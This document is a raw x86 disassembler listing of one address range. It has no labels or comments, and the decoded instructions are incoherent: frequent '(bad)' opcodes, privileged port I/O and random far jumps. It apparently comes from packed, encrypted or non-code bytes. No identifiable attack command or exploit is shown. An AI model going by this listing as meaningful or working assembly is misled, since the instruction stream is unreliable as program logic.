  412e6c:	and    BYTE PTR ds:0x31060e88,0x5b
  412e74:	mov    ch,0xee
  412e76:	push   0x5cb4ebde
  412e7b:	dec    eax
  412e7c:	test   DWORD PTR [eax+0x38],0x3dfe4a21
  412e83:	and    DWORD PTR [ebp-0x39e3a404],esp
  412e89:	sub    BYTE PTR [edx],ch
  412e8b:	mov    bl,0x96
  412e8d:	not    BYTE PTR [ebx]
  412e8f:	pop    eax
  412e90:	adc    al,0x2
  412e92:	cmp    eax,0x2631035d
  412e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e98:	(bad)
  412e9c:	jp     0x412e87
  412e9e:	leave  
  412e9f:	pushf  
  412ea0:	daa    
  412ea1:	mov    ebp,0x5ceeac11
  412ea6:	and    esi,DWORD PTR [eax+0x66]
  412ea9:	mov    ch,0xe2
  412eab:	aaa    
  412eac:	pop    ebx
  412ead:	jae    0x412e45
  412eaf:	jmp    0x412e76
  412eb1:	fisttp WORD PTR [edi]
  412eb3:	push   es
  412eb4:	inc    eax
  412eb5:	jne    0x412efe
  412eb7:	jl     0x412e6e
  412eb9:	cwde   
  412eba:	xor    eax,0x8b10a6a9
  412ebf:	adc    eax,DWORD PTR [edi-0x41]
  412ec2:	fnstenv [ecx-0x6debe79a]
  412ec8:	pop    eax
  412ec9:	jbe    0x412e5b
  412ecb:	cmp    al,0x84
  412ecd:	ja     0x412eac
  412ecf:	out    dx,eax
  412ed0:	xor    ebx,DWORD PTR [ecx-0x42]
  412ed3:	shl    DWORD PTR [ecx],cl
  412ed5:	inc    edi
  412ed6:	idiv   DWORD PTR [esi-0x11c877d5]
  412edc:	xchg   esi,eax
  412edd:	or     eax,0x3a527303
  412ee2:	into   
  412ee3:	sbb    DWORD PTR [ebp-0x24],edx
  412ee6:	imul   ecx,ebp,0x1c
  412ee9:	pop    edi
  412eea:	shl    bh,1
  412eec:	adc    al,0x69
  412eee:	or     edi,DWORD PTR [ecx]
  412ef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ef1:	int3   
  412ef2:	ret    0xe230
  412ef5:	dec    ebx
  412ef6:	sbb    BYTE PTR [edx],bl
  412ef8:	mov    ebx,0x90132933
  412efd:	mov    ah,0xe1
  412eff:	and    BYTE PTR [ebx-0x16d75888],al
  412f05:	scas   al,BYTE PTR es:[edi]
  412f06:	ins    DWORD PTR es:[edi],dx
  412f07:	mov    dh,cl
  412f09:	or     DWORD PTR [ebx],edx
  412f0b:	imul   ebp,DWORD PTR [edx-0x1edbc5c4],0x51
  412f12:	mov    ds:0x91d505c,al
  412f17:	jecxz  0x412e9a
  412f19:	mov    ds:0x51b53b44,al
  412f1e:	push   cs
  412f1f:	jns    0x412eeb
  412f21:	xlat   BYTE PTR ds:[ebx]
  412f22:	cmp    BYTE PTR [ebp+0x6e],bh
  412f25:	add    BYTE PTR [ebx-0xb3e29ed],bh
  412f2b:	xor    ch,dl
  412f2d:	(bad)  
  412f2e:	clc    
  412f2f:	fist   WORD PTR [ebx]
  412f31:	(bad)  
  412f32:	daa    
  412f33:	stos   BYTE PTR es:[edi],al
  412f34:	and    al,BYTE PTR [ebx+0x742522]
  412f3a:	jg     0x412f53
  412f3c:	cmp    esp,DWORD PTR ds:0xf3d6a9b3
  412f42:	or     eax,0xc4fbc6f0
  412f47:	mov    al,ds:0x6d9c5e7
  412f4c:	mov    WORD PTR [edi+eax*2+0x7794de5],cs
  412f53:	lds    edi,FWORD PTR [edi]
  412f55:	mov    dl,0x2a
  412f57:	mov    bh,0x2f
  412f59:	mov    bl,0x51
  412f5b:	rcr    BYTE PTR [eax+0x70f37ebf],0x2b
  412f62:	xchg   edx,eax
  412f63:	dec    ebp
  412f64:	loop   0x412fb5
  412f66:	arpl   si,sp
  412f68:	mov    WORD PTR [edx+0x68],?
  412f6b:	xchg   DWORD PTR [ecx-0x6e12a82b],edx
  412f71:	mov    esi,0xdc799dcc
  412f76:	mov    ds:0xd9bb912f,eax
  412f7b:	(bad)  
  412f7c:	sti    
  412f7d:	(bad)  
  412f7e:	aas    
  412f7f:	or     esi,ecx
  412f81:	or     ah,BYTE PTR [ebx-0x33]
  412f84:	(bad)  
  412f85:	ror    BYTE PTR ds:0x4546a860,1
  412f8b:	dec    ebx
  412f8c:	out    dx,al
  412f8d:	shr    DWORD PTR [esi-0x1f],cl
  412f90:	daa    
  412f91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f92:	sub    DWORD PTR [edx-0x2f],0xb
  412f96:	xchg   ecx,eax
  412f97:	(bad)  
  412f99:	inc    ecx
  412f9a:	and    ebx,ecx
  412f9c:	(bad)
  412f9f:	push   ebp
  412fa0:	inc    esi
  412fa1:	mov    ch,0x49
  412fa3:	mov    eax,0x143d438a
  412fa8:	enter  0xe04c,0x76
  412fac:	pop    eax
  412fad:	mov    eax,ds:0x9b5dccd5
  412fb2:	sbb    eax,0x18a80d20
  412fb7:	or     bl,BYTE PTR [edi]
  412fb9:	xchg   ebp,edx
  412fbb:	jnp    0x412f8a
  412fbd:	mov    eax,0x51fc57af
  412fc2:	add    al,0x8c
  412fc4:	push   ebx
  412fc5:	push   es
  412fc6:	xor    dl,ch
  412fc8:	push   edi
  412fc9:	shr    DWORD PTR ds:0x426b9ea1,cl
  412fcf:	add    BYTE PTR [ebx+0x506e900],cl
  412fd5:	add    BYTE PTR [eax],al
  412fd7:	aas    
  412fd8:	(bad)  
  412fd9:	vpmullw ymm1,ymm6,ymm5
  412fdd:	xlat   BYTE PTR ds:[ebx]
  412fde:	(bad)  
  412fdf:	jne    0x412fff
  412fe1:	fs aas 
  412fe3:	mov    ecx,0x888dbd2
  412fe8:	or     al,0x7f
  412fea:	js     0x413056
  412fec:	jl     0x413066
  412fee:	js     0x413000
  412ff0:	jg     0x412f72
  412ff2:	cli    
  412ff3:	dec    ebp
  412ff4:	inc    eax
  412ff5:	push   ds
  412ff6:	mov    DWORD PTR [ebx],ecx
  412ff8:	xor    BYTE PTR [edx+0xe812490],bl
  412ffe:	scas   al,BYTE PTR es:[edi]
  412fff:	mov    ecx,0xadc51fda
  413004:	gs adc esi,edi
  413007:	ror    DWORD PTR [ebp-0x64c01328],1
  41300d:	bnd ja 0x412fda
  413010:	mov    ?,WORD PTR [ebp+0x4a777670]
  413016:	popf   
  413017:	push   0x59943309
  41301c:	neg    BYTE PTR [ecx-0x77]
  41301f:	pop    ss
  413020:	std    
  413021:	jne    0x413019
  413023:	test   esi,eax
  413025:	pop    es
  413026:	dec    edx
  413027:	pop    eax
  413028:	enter  0xc223,0xa4
  41302c:	dec    eax
  41302d:	mov    ebx,0xd521b02f
  413032:	(bad)  
  413033:	out    0x32,eax
  413035:	pop    edi
  413036:	enter  0xf3f9,0x4a
  41303a:	add    edx,DWORD PTR [esi+0x77]
  41303d:	push   eax
  41303e:	loope  0x413091
  413040:	loop   0x412fdd
  413042:	les    eax,FWORD PTR [ebx]
  413044:	sub    DWORD PTR [esi],0xb5c725ff
  41304a:	xor    DWORD PTR ds:0xc7e86b45,edi
  413050:	out    0xd2,eax
  413052:	dec    eax
  413053:	cmp    edx,DWORD PTR [esi]
  413055:	stos   BYTE PTR es:[edi],al
  413056:	stos   BYTE PTR es:[edi],al
  413057:	mov    bl,0x2b
  413059:	std    
  41305a:	inc    edx
  41305b:	(bad)  
  41305c:	gs call 0xe5dd:0xbb7c5963
  413064:	ins    DWORD PTR es:[edi],dx
  413065:	xchg   edx,eax
  413066:	pop    esi
  413067:	jp     0x41300a
  413069:	mov    DWORD PTR [edx+edx*4+0x43],esp
  41306d:	stos   DWORD PTR es:[edi],eax
  41306e:	mov    eax,0x431779e4
  413073:	ins    DWORD PTR es:[edi],dx
  413074:	jmp    0x74f86ea5
  413079:	lods   eax,DWORD PTR ds:[esi]
  41307a:	jo     0x4130ca
  41307c:	adc    ch,BYTE PTR [ecx]
  41307e:	push   0x7e0a3952
  413083:	jnp    0x41306b
  413085:	(bad)  
  413086:	adc    al,0x61
  413088:	sub    DWORD PTR [eax+0x23],esp
  41308b:	sbb    edx,ebx
  41308d:	mov    edx,cs
  41308f:	(bad)  
  413090:	retf   
  413091:	or     ch,BYTE PTR [edx+edx*4+0x42]
  413095:	imul   ebp,DWORD PTR [ebx-0x2fd5cd65],0xffffffe6
  41309c:	retf   
  41309d:	xchg   esp,eax
  41309e:	int    0xc1
  4130a0:	inc    edx
  4130a1:	sbb    eax,edi
  4130a3:	out    dx,al
  4130a4:	dec    esp
  4130a5:	fdivr  QWORD PTR [eax+ecx*1-0x7c]
  4130a9:	ins    BYTE PTR es:[edi],dx
  4130aa:	or     BYTE PTR [ecx-0x13e4b3a1],ch
  4130b0:	mov    esp,0xc9236bd4
  4130b5:	and    DWORD PTR [edi],eax
  4130b7:	xor    BYTE PTR [bp+di-0x21],al
  4130bb:	lahf   
  4130bc:	cmc    
  4130bd:	jmp    0x51fc:0x4edb68b3
  4130c4:	arpl   WORD PTR [eax-0x703056a2],cx
  4130ca:	mov    dl,0x15
  4130cc:	test   al,0xec
  4130ce:	(bad)  
  4130cf:	mov    bh,0xf
  4130d1:	icebp  
  4130d2:	in     eax,0x2a
  4130d4:	jg     0x4130ef
  4130d6:	dec    edi
  4130d7:	(bad)  
  4130d9:	mov    ah,0xcf
  4130db:	out    0x92,eax
  4130dd:	xor    dh,BYTE PTR [esi-0x58b662ae]
  4130e3:	add    eax,0x8eb28d6f
  4130e8:	inc    esp
  4130e9:	mov    ah,0x7a
  4130eb:	test   al,0xd7
  4130ed:	(bad)  
  4130ee:	fsub   DWORD PTR [ebx]
  4130f0:	in     eax,dx
  4130f1:	icebp  
  4130f2:	cmp    eax,0x6d37c4c5
  4130f7:	call   0x8075afc9
  4130fc:	or     ebx,DWORD PTR [edx+0x29]
  4130ff:	jnp    0x4130f1
  413101:	jmp    0x2c52:0x1f8ea2a9
  413108:	clc    
  413109:	add    al,0x38
  41310b:	std    
  41310c:	mov    dh,0x8a
  41310e:	imul   edx,DWORD PTR [esi+0x455c7a8a],0x72629a2a
  413118:	jg     0x413180
  41311a:	ja     0x413134
  41311c:	mov    eax,ds:0x2e029e0e
  413121:	jno    0x4130a6
  413123:	pop    eax
  413124:	sub    esp,0xffffffec
  413127:	mov    al,ds:0x4771a4b3
  41312c:	jno    0x41312e
  41312e:	not    BYTE PTR [ebx-0x16]
  413131:	pop    ax
  413133:	add    edx,DWORD PTR [ecx-0x55]
  413136:	push   0xffffffb8
  413138:	jb     0x41311e
  41313a:	test   DWORD PTR [edi],eax
  41313c:	mov    edi,0xc70975e9
  413141:	aas    
  413142:	jl     0x413121
  413144:	mov    bl,BYTE PTR [ebx]
  413146:	inc    edx
  413147:	cld    
  413148:	mov    ch,0x4f
  41314a:	jae    0x4130e0
  41314c:	inc    ebx
  41314d:	hlt    
  41314e:	cld    
  41314f:	out    0x23,al
  413151:	stos   DWORD PTR es:[edi],eax
  413152:	test   eax,0xcb4e8590
  413157:	mov    ah,ch
  413159:	ins    DWORD PTR es:[edi],dx
  41315a:	push   esi
  41315b:	mov    esp,esi
  41315d:	pop    esp
  41315e:	icebp  
  41315f:	push   edi
  413160:	ds stc 
  413162:	test   eax,0xc2b0028d
  413167:	add    edx,esi
  413169:	ss push cs
  41316b:	addr16 push ds
  41316d:	add    DWORD PTR [ebx+0x68eae1f1],esi
  413173:	(bad)  
  413174:	cmc    
  413175:	(bad)  
  413176:	dec    esi
  413177:	sbb    BYTE PTR [esi],bh
  413179:	mov    bh,0x39
  41317b:	jnp    0x41313f
  41317d:	fs jle 0x41311f
  413180:	xlat   BYTE PTR ds:[ebx]
  413181:	call   0x61f1ec73
  413186:	ja     0x4131da
  413188:	pop    ds
  413189:	mov    al,0x2
  41318b:	outs   dx,DWORD PTR ds:[esi]
  41318c:	lods   al,BYTE PTR ds:[esi]
  41318d:	cmp    DWORD PTR ds:0x21684333,0xdcfc4fc3
  413197:	cmp    ax,0xac48
  41319b:	test   eax,0xfede9416
  4131a0:	mov    al,ds:0x54a21304
  4131a5:	imul   esp,esp,0x3e
  4131a8:	sbb    ah,ah
  4131aa:	add    dh,BYTE PTR [eax-0x3]
  4131ad:	xor    eax,0xf4fa7434
  4131b2:	clc    
  4131b3:	sub    eax,0x350c52b2
  4131b8:	xchg   ebp,eax
  4131b9:	xchg   BYTE PTR [ebp+0x17b59f3c],ah
  4131bf:	outs   dx,DWORD PTR ds:[esi]
  4131c0:	arpl   WORD PTR [edi-0x48c9534c],sp
  4131c6:	dec    esi
  4131c7:	fstp   TBYTE PTR [edx]
  4131c9:	(bad)  
  4131cb:	shl    BYTE PTR [esi],0x55
  4131ce:	enter  0x33c,0xe3
  4131d2:	cmp    ecx,DWORD PTR [eax+0x6fc3ea03]
  4131d8:	add    BYTE PTR [edx-0x3c9fd8b],bh
  4131de:	fmul   QWORD PTR [eax+eiz*4+0x73b4c760]
  4131e5:	lsl    ebp,WORD PTR [ecx-0x2b]
  4131e9:	sahf   
  4131ea:	pmulhuw mm7,QWORD PTR [ecx+ebx*1-0x18]
  4131ef:	xlat   BYTE PTR ds:[ebx]
  4131f0:	jb     0x4131a5
  4131f2:	into   
  4131f3:	dec    esp
  4131f4:	mov    WORD PTR [esi],gs
  4131f6:	arpl   WORD PTR [esi],sp
  4131f8:	push   edi
  4131f9:	enter  0xd41,0x78
  4131fd:	inc    esp
  4131fe:	inc    eax
  4131ff:	xchg   ebp,eax
  413200:	sbb    al,0x84
  413202:	lods   al,BYTE PTR ds:[esi]
  413203:	push   ebx
  413204:	ins    BYTE PTR es:[edi],dx
  413205:	cmc    
  413206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413207:	push   ebp
  413208:	sub    cl,BYTE PTR [ebx+0x6e90c88b]
  41320e:	inc    edx
  41320f:	imul   esp,DWORD PTR [edi-0x3c6ca67],0x24
  413216:	add    bh,ch
  413218:	repz jecxz 0x413220
  41321b:	pop    ds
  41321c:	lds    ebx,FWORD PTR [esi+0x203a6]
  413222:	fnstenv [ecx+0x1ccd37b2]
  413228:	pause  
  41322a:	xchg   ecx,eax
  41322b:	sahf   
  41322c:	inc    edi
  41322d:	jp     0x41325e
  41322f:	mov    DWORD PTR [esi-0x48],ebp
  413232:	jae    0x4131de
  413234:	adc    DWORD PTR [ecx+0x62],0x66
  413238:	shl    esp,cl
  41323a:	lds    edi,FWORD PTR [ebp-0x64]
  41323d:	or     bl,BYTE PTR [esi+edx*4-0x71]
  413241:	sbb    al,0x7c
  413243:	adc    al,0xa4
  413245:	add    edi,DWORD PTR [esi]
  413247:	mov    edi,0x2fda1230
  41324c:	mov    esi,0xd7613011
  413251:	mov    ch,0x9d
  413253:	into   
  413254:	ins    DWORD PTR es:[edi],dx
  413255:	push   edx
  413256:	adc    al,0xfc
  413258:	icebp  
  413259:	push   eax
  41325a:	jmp    DWORD PTR [ebp-0x2a546833]
  413260:	pop    ds
  413261:	jb     0x413264
  413263:	pop    es
  413264:	add    ah,ch
  413266:	les    edi,FWORD PTR [ebx-0x60882c6b]
  41326c:	ss fcmovbe st,st(5)
  41326f:	and    bh,BYTE PTR ds:0x5c821ab1
  413275:	xor    BYTE PTR [ebx],0xe5
  413278:	jns    0x4132ab
  41327a:	add    eax,0x508a3e5e
  41327f:	xchg   edx,eax
  413280:	or     bh,BYTE PTR [esi]
  413282:	mov    ebp,0xe831e2ed
  413287:	inc    esp
  413288:	test   DWORD PTR [ecx+0x7984bda1],0x48bd84c3
  413292:	pop    eax
  413293:	mov    esi,?
  413295:	sub    al,0x4c
  413297:	push   eax
  413298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413299:	mov    esi,0x72bbf078
  41329e:	xchg   esi,eax
  41329f:	xor    DWORD PTR [ebx+0x34d582a7],ebx
  4132a5:	rcl    BYTE PTR [ecx-0x10e87373],0xd
  4132ac:	xor    edx,DWORD PTR [ebp+0x102f25fc]
  4132b2:	adc    al,0x4
  4132b4:	jno    0x41325d
  4132b6:	push   edx
  4132b7:	lahf   
  4132b8:	(bad)  
  4132b9:	cld    
  4132ba:	cmp    eax,0x919acb72
  4132bf:	(bad)  
  4132c0:	sub    ah,ah
  4132c2:	cdq    
  4132c3:	lea    esp,[edx-0x59fc0eff]
  4132c9:	and    al,BYTE PTR [eax+0x3b]
  4132cc:	or     eax,eax
  4132ce:	test   DWORD PTR [edx],esp
  4132d0:	(bad)  
  4132d1:	push   edi
  4132d2:	xchg   bx,ax
  4132d4:	out    0x23,eax
  4132d6:	inc    eax
  4132d7:	loopne 0x41332f
  4132d9:	loop   0x41329d
  4132db:	out    0xa7,eax
  4132dd:	shl    bh,0xb7
  4132e0:	ss inc edi
  4132e2:	push   edi
  4132e3:	imul   edx,DWORD PTR [ebp-0x18],0xe7bac29f
  4132ea:	pop    es
  4132eb:	mov    bl,0x74
  4132ed:	sahf   
  4132ee:	mov    ebp,0xc48fdd5c
  4132f3:	outs   dx,BYTE PTR ds:[esi]
  4132f4:	xchg   edx,eax
  4132f5:	out    0xa7,al
  4132f7:	jnp    0x4132d7
  4132f9:	sar    BYTE PTR [ebx+0x1b],cl
  4132fc:	fwait
  4132fd:	loopne 0x4132fd
  4132ff:	mov    edi,0xa6205778
  413304:	xor    ebx,DWORD PTR [ebx+0x5e8f7361]
  41330a:	lea    esp,ds:0x89245b18
  413310:	jle    0x413387
  413312:	xchg   ebp,eax
  413313:	jmp    0xa8c7:0x1f8afd59
  41331a:	cld    
  41331b:	imul   BYTE PTR [ebx-0x7b]
  41331e:	cmp    BYTE PTR [esi],0x21
  413321:	mov    cs,WORD PTR [ebx-0x64]
  413324:	xor    DWORD PTR [ebp-0x5814312b],0xaf05e4ed
  41332e:	mov    WORD PTR cs:[ecx],cs
  413331:	mov    ch,0xac
  413333:	out    0x75,eax
  413335:	adc    ch,BYTE PTR [edx+0x1fa328c1]
  41333b:	push   esp
  41333c:	and    DWORD PTR [eax-0x7032c4a],0x41d6906e
  413346:	pop    es
  413347:	push   esi
  413348:	pop    ebp
  413349:	(bad)  
  41334a:	add    BYTE PTR [esi-0x4d0a324d],0xdd
  413351:	stos   DWORD PTR es:[edi],eax
  413352:	push   0x5be60717
  413357:	adc    eax,0x8060e599
  41335c:	push   ss
  41335d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41335e:	dec    esi
  41335f:	mov    al,0x34
  413361:	les    edx,FWORD PTR [edi+0x1a]
  413364:	sti    
  413365:	mov    ah,0x3a
  413367:	or     BYTE PTR [edi+0x2],cl
  41336a:	in     al,dx
  41336b:	and    edx,eax
  41336d:	leave  
  41336e:	(bad)  
  413370:	popa   
  413371:	fnstcw WORD PTR [edx+0x7d674125]
  413377:	mov    dl,0xa0
  413379:	call   0x3ded:0x931d3e95
  413380:	fisttp QWORD PTR [eax-0x8]
  413383:	lea    ecx,[ebp-0x52]
  413386:	mov    dh,0x64
  413388:	inc    ebx
  413389:	mov    esi,0x1adfc94a
  41338e:	clc    
  41338f:	jg     0x4133e3
  413391:	mov    dh,0x94
  413393:	push   ss
  413394:	lods   eax,DWORD PTR ds:[esi]
  413395:	adc    eax,0xc3f1ab95
  41339a:	mov    esi,0x23155188
  41339f:	ja     0x4133bf
  4133a1:	cmp    edi,ebx
  4133a3:	add    DWORD PTR ds:0x26286389,edx
  4133a9:	mov    eax,DWORD PTR [ecx+0x5a]
  4133ac:	adc    BYTE PTR [ebp-0x5508891a],0xe3
  4133b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133b4:	push   ebp
  4133b5:	fidiv  DWORD PTR [esi+0x3d]
  4133b8:	int3   
  4133b9:	sbb    esi,0x3e141487
  4133bf:	xor    BYTE PTR [ecx+0x7394e760],0x86
  4133c6:	daa    
  4133c7:	add    eax,0x3994b63c
  4133cc:	jnp    0x41337d
  4133ce:	ja     0x4133d6
  4133d0:	lahf   
  4133d1:	mov    edi,0xa4f8a00b
  4133d6:	xor    ebx,DWORD PTR [ebp-0x32c7d0d7]
  4133dc:	shr    DWORD PTR ds:0x2101bb3b,1
  4133e2:	int    0xb4
  4133e4:	cmp    al,0x94
  4133e6:	or     al,al
  4133e8:	pushf  
  4133e9:	mov    eax,ds:0x45795608
  4133ee:	shl    al,1
  4133f0:	bound  esp,QWORD PTR [edi-0x3c3be1f2]
  4133f6:	dec    esi
  4133f7:	pop    edx
  4133f8:	inc    edi
  4133f9:	inc    eax
  4133fa:	dec    ebx
  4133fb:	dec    esi
  4133fc:	adc    cl,BYTE PTR [edx-0x1a]
  4133ff:	pushf  
  413400:	jne    0x413463
  413402:	jmp    0x604f:0x1bdcb5b6
  413409:	xlat   BYTE PTR ds:[ebx]
  41340a:	dec    ebx
  41340b:	or     al,0xa7
  41340d:	inc    ebp
  41340e:	jne    0x413411
  413410:	add    al,BYTE PTR [edi+0x77665beb]
  413416:	cmc    
  413417:	mov    ecx,DWORD PTR [edi]
  413419:	(bad)  
  41341a:	not    DWORD PTR [edx-0x7c]
  41341d:	sbb    al,0xec
  41341f:	jae    0x413469
  413421:	(bad)  
  413422:	mov    ch,0x49
  413424:	fmul   QWORD PTR [edi+0x44fbb9f8]
  41342a:	xor    bh,BYTE PTR [ebx+0x1]
  41342d:	cdq    
  41342e:	pop    ebx
  41342f:	mov    BYTE PTR [edi+0x5a],0x5a
  413433:	js     0x4134af
  413435:	xchg   DWORD PTR [ebp-0x7cbfdc93],ebx
  41343b:	shr    ch,cl
  41343d:	arpl   WORD PTR [edi+0x71],sp
  413440:	sbb    ecx,DWORD PTR [ebx+0x1e]
  413443:	fistp  DWORD PTR [eax]
  413445:	loopne 0x413410
  413447:	push   ss
  413448:	pop    edx
  413449:	xor    DWORD PTR [ebx],0xffffff9a
  41344c:	xor    ebx,DWORD PTR [eax+0x44]
  41344f:	mov    ebx,DWORD PTR [esi]
  413451:	jae    0x4134b6
  413453:	addr16 cmc 
  413455:	add    eax,0x54b7acd4
  41345a:	fld    DWORD PTR [ebp-0x27b0afb2]
  413460:	pop    esp
  413461:	ret    0x3883
  413464:	and    ebx,DWORD PTR [edx-0x9c59f46]
  41346a:	rcl    ecx,1
  41346c:	pop    ebp
  41346d:	jo     0x413410
  41346f:	cwde   
  413470:	mov    esi,edx
  413472:	xor    al,0xd1
  413474:	(bad)  
  413475:	hlt    
  413476:	icebp  
  413477:	dec    ecx
  413478:	cmp    al,0x4e
  41347a:	pop    ebx
  41347b:	call   0x74bf47d3
  413480:	inc    eax
  413481:	dec    edi
  413482:	out    0x98,eax
  413484:	mov    ah,0xb5
  413486:	aam    0x8d
  413488:	mov    bl,0x4d
  41348a:	std    
  41348b:	test   esp,ecx
  41348d:	jne    0x413453
  41348f:	jbe    0x4134a1
  413491:	and    al,0x83
  413493:	pop    edi
  413494:	push   ecx
  413495:	pop    esp
  413496:	out    dx,eax
  413497:	mov    al,0xa5
  413499:	jmp    0x32dd48a8
  41349e:	popa   
  41349f:	(bad)  
  4134a0:	sbb    WORD PTR [esi],dx
  4134a3:	mov    ch,BYTE PTR [ecx]
  4134a5:	cmp    ecx,0xffffffee
  4134a8:	popa   
  4134a9:	stc    
  4134aa:	pop    es
  4134ab:	or     DWORD PTR [edx],esp
  4134ad:	iret   
  4134ae:	sti    
  4134af:	pop    esi
  4134b0:	and    eax,0xd6046fd7
  4134b5:	xlat   BYTE PTR ds:[ebx]
  4134b6:	xchg   esp,eax
  4134b7:	mov    ebp,0x5d765608
  4134bc:	pusha  
  4134bd:	sbb    eax,0xba4b82b4
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	mov    ebx,0xd7aad62f
  4134c8:	dec    ebx
  4134c9:	jge    0x41351b
  4134cb:	or     DWORD PTR [ebx+0x42baacd0],0x644b8736
  4134d5:	shr    DWORD PTR [edi+0x7f],0xae
  4134d9:	jp     0x4134c9
  4134db:	je     0x4134d2
  4134dd:	push   DWORD PTR [eax]
  4134df:	lea    eax,ds:0x426bba
  4134e5:	push   DWORD PTR [eax]
  4134e7:	jmp    0x4139f2
  4134ec:	cmp    al,0x3c
  4134ee:	rol    eax,cl
  4134f0:	rcl    edi,cl
  4134f2:	fcmovnb st,st(4)
  4134f4:	mov    DWORD PTR [edx],edx
  4134f6:	inc    edi
  4134f7:	shl    BYTE PTR [esi],1
  4134f9:	inc    esp
  4134fa:	jle    0x413555
  4134fc:	jp     0x41350e
  4134fe:	jg     0x413578
  413500:	push   0x7c
  413502:	js     0x41357c
  413504:	(bad)  
  413505:	js     0x413565
  413507:	das    
  413508:	stc    
  413509:	dec    ecx
  41350a:	in     eax,dx
  41350b:	sub    esi,DWORD PTR [eax+0x46]
  41350e:	ja     0x413532
  413510:	aas    
  413511:	fldenv [ecx+0x11]
  413514:	mov    bh,0x99
  413516:	dec    ebx
  413517:	loope  0x413528
  413519:	ins    DWORD PTR es:[edi],dx
  41351a:	push   ds
  41351b:	or     al,0xa0
  41351d:	pop    esi
  41351e:	pop    ds
  41351f:	mov    cl,0x67
  413521:	inc    edx
  413522:	push   eax
  413523:	ret    
  413524:	fwait
  413525:	sti    
  413526:	or     edi,ebx
  413528:	jecxz  0x413576
  41352a:	inc    ebp
  41352b:	rcr    DWORD PTR [ecx+0x6a],cl
  41352e:	ret    0x3d22
  413531:	dec    ebp
  413532:	repnz sbb al,0x8a
  413535:	mov    esi,0xf399c37b
  41353a:	test   ecx,esp
  41353c:	pop    ds
  41353d:	add    eax,DWORD PTR [ebx]
  41353f:	cdq    
  413540:	push   ebp
  413541:	pop    ds
  413542:	(bad)  
  413543:	das    
  413544:	in     al,dx
  413545:	sti    
  413546:	inc    eax
  413547:	fdiv   st(0),st
  413549:	je     0x413549
  41354b:	aam    0x2c
  41354d:	or     al,0xc5
  41354f:	adc    ebp,DWORD PTR [edi+ecx*4+0x35f98da4]
  413556:	push   ecx
  413557:	mov    WORD PTR [ecx+ecx*4-0x33],ds
  41355b:	adc    edx,DWORD PTR [edi+ebx*1-0x4e]
  41355f:	int    0xb9
  413561:	mov    edi,0x9ab9c715
  413566:	and    esi,DWORD PTR [esi]
  413568:	push   esi
  413569:	sahf   
  41356a:	xchg   BYTE PTR [ebp+0xc],ah
  41356d:	movzx  edx,BYTE PTR [eax+0x3a]
  413571:	popf   
  413572:	retf   0x7fac
  413575:	mov    DWORD PTR [ebx+0x50],esi
  413578:	addr16 clc 
  41357a:	sub    DWORD PTR [eax-0x4e],esi
  41357d:	mov    bl,BYTE PTR [esi+eax*8+0x7df93632]
  413584:	or     BYTE PTR [ebx+esi*2+0x51],0x0
  413589:	das    
  41358a:	lea    edi,[edx-0x1a6b5072]
  413590:	xor    eax,0xa43889c0
  413595:	es sahf 
  413597:	rol    BYTE PTR [esi-0x52],cl
  41359a:	outs   dx,BYTE PTR ds:[esi]
  41359b:	jmp    0x9bc7:0xd9d52ade
  4135a2:	ret    
  4135a3:	inc    esi
  4135a4:	adc    esi,eax
  4135a6:	mov    dl,0xbe
  4135a8:	popa   
  4135a9:	push   ecx
  4135aa:	push   ebx
  4135ab:	fwait
  4135ac:	jbe    0x41357c
  4135ae:	mov    ebp,0x38193459
  4135b3:	or     dh,BYTE PTR [eax-0x7e9611b]
  4135b9:	test   DWORD PTR [esi],edx
  4135bb:	(bad)  
  4135bd:	gs iret 
  4135bf:	call   0x47919868
  4135c4:	inc    BYTE PTR [ecx+esi*2+0x58edc619]
  4135cb:	or     dl,BYTE PTR [ebx]
  4135cd:	bnd jno 0x413594
  4135d0:	loopne 0x4135d9
  4135d2:	push   cs
  4135d3:	test   eax,0xfdcb5f01
  4135d8:	jp     0x4135d1
  4135da:	mov    al,0xd6
  4135dc:	jle    0x4135ee
  4135de:	imul   eax,DWORD PTR [edi+0x58],0xc2283bbd
  4135e5:	push   ebx
  4135e6:	sub    esp,DWORD PTR [eax]
  4135e8:	ret    
  4135e9:	jmp    0x8267:0x7c733bb3
  4135f0:	and    eax,0x7db3639f
  4135f5:	cld    
  4135f6:	add    DWORD PTR [edi-0x4036dcaa],edi
  4135fc:	popf   
  4135fd:	into   
  4135fe:	loopne 0x413652
  413600:	call   0x6354:0xfd08bdd7
  413607:	sbb    eax,0x16275f76
  41360c:	loope  0x41361b
  41360e:	ss cmp al,0x5a
  413611:	adc    BYTE PTR [eax+0x57],0x46
  413615:	push   0xffffffe9
  413617:	test   eax,0x215dc404
  41361c:	fdiv   st,st(2)
  41361e:	or     al,cl
  413620:	shl    bh,cl
  413622:	(bad)  
  413623:	pushf  
  413624:	fist   WORD PTR [esi+0x487d538a]
  41362a:	fist   WORD PTR [edx+0x4a1f3fa2]
  413630:	xchg   ebx,eax
  413631:	xchg   ebx,eax
  413632:	in     al,0x1a
  413634:	icebp  
  413635:	xchg   ebp,eax
  413636:	pop    esi
  413637:	cdq    
  413638:	jmp    0x259e4a24
  41363d:	mov    DWORD PTR [ebx-0x51],esp
  413640:	xor    DWORD PTR [esi],ebp
  413642:	mov    dl,ch
  413644:	fmul   DWORD PTR [esi]
  413646:	mov    dl,dh
  413648:	adc    al,0xa6
  41364a:	call   0x4d8e:0x61078510
  413651:	enter  0x4c40,0x13
  413655:	ins    BYTE PTR es:[edi],dx
  413656:	lea    esp,[edi]
  413658:	outs   dx,BYTE PTR ds:[esi]
  413659:	mov    ebx,0xad53c695
  41365e:	test   al,0x4a
  413660:	mov    bl,0xbc
  413662:	cwde   
  413663:	(bad)  
  413664:	in     al,dx
  413665:	dec    esi
  413666:	paddw  mm2,QWORD PTR [edx+0x55]
  41366a:	cwde   
  41366b:	rol    DWORD PTR [esi+ebp*2-0x205fd847],0x66
  413673:	shl    edx,0x3
  413676:	mov    cl,0xf7
  413678:	sub    BYTE PTR [esp+ecx*4+0x33],bh
  41367c:	leave  
  41367d:	stos   BYTE PTR es:[edi],al
